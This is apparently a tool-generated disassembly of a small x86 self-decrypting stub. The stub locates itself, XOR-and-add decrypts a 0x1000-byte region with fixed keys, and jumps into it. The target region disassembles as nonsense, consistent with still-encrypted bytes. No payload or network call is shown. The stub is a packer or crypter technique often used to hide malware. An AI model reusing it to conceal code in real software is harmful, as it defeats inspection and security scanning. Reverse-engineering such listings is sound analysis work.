0x00522000:	cmpb	%ch, (%esi)	; from: 0x005d4045(MAY)
0x00522002:	movb	$0xffffffdb, %al
0x00522004:	lock andl	$0xb021f0da, -2001306469(%ebp)
0x0052200f:	andl	%ebx, %ebp
0x00522011:	pushfl	
0x00522012:	movb	$0xffffffdb, %al
0x00522014:	lock movl	0x5d7bb2f8, %eax
0x0052201a:	bswap	%esp
0x0052201c:	stosl	%eax, %es:(%edi)
0x0052201d:	addb	$0xffffffc2, %al
0x0052201f:	hlt	

start:
0x005d4000:	subl	$0x4, %esp
0x005d4003:	pushl	%eax
0x005d4004:	pushl	%ebx
0x005d4005:	call	0x005d400b	; targets: 0x005d400b(MAY)
0x005d400b:	popl	%eax	; from: 0x005d4005(MAY)
0x005d400c:	movl	%eax, %ebx
0x005d400e:	incl	%eax
0x005d400f:	subl	$0xb2000, %eax
0x005d4014:	subl	$0x1009bd33, %eax
0x005d4019:	addl	$0x1009bd28, %eax
0x005d401e:	cmpb	$0xffffffcc, (%ebx)
0x005d4021:	jne	0x005d403c	; targets: 0x005d4023(MAY)
0x005d4023:	movb	$0x0, (%ebx)	; from: 0x005d4021(MAY)
0x005d4026:	movl	$0x1000, %ebx
0x005d402b:	pushl	$0x29d0c851
0x005d4030:	pushl	$0xd9f165f
0x005d4035:	pushl	%ebx
0x005d4036:	pushl	%eax
0x005d4037:	call	0x005d4046	; targets: 0x005d4046(MAY)
0x005d403c:	addl	$0x0, %eax	; from: 0x005d406f(MAY)
0x005d403f:	movl	%eax, 0x8(%esp)
0x005d4043:	popl	%ebx
0x005d4044:	popl	%eax
0x005d4045:	ret	; targets: 0x00522000(MAY)

0x005d4046:	pushl	%ebp	; from: 0x005d4037(MAY)
0x005d4047:	movl	%esp, %ebp
0x005d4049:	pushl	%eax
0x005d404a:	pushl	%ebx
0x005d404b:	pushl	%ecx
0x005d404c:	pushl	%esi
0x005d404d:	movl	0x8(%ebp), %esi
0x005d4050:	movl	0xc(%ebp), %ecx
0x005d4053:	shrl	$0x2, %ecx
0x005d4056:	movl	0x10(%ebp), %eax
0x005d4059:	movl	0x14(%ebp), %ebx
0x005d405c:	testl	%ecx, %ecx	; from: 0x005d4068(MAY)
0x005d405e:	je	0x005d406a	; targets: 0x005d406a(MAY), 0x005d4060(MAY)
0x005d4060:	xorl	%eax, (%esi)	; from: 0x005d405e(MAY)
0x005d4062:	addl	%ebx, (%esi)
0x005d4064:	addl	$0x4, %esi
0x005d4067:	decl	%ecx
0x005d4068:	jmp	0x005d405c	; targets: 0x005d405c(MAY)
0x005d406a:	popl	%esi	; from: 0x005d405e(MAY)
0x005d406b:	popl	%ecx
0x005d406c:	popl	%ebx
0x005d406d:	popl	%eax
0x005d406e:	leave	
0x005d406f:	ret	$0x10	; targets: 0x005d403c(MAY)

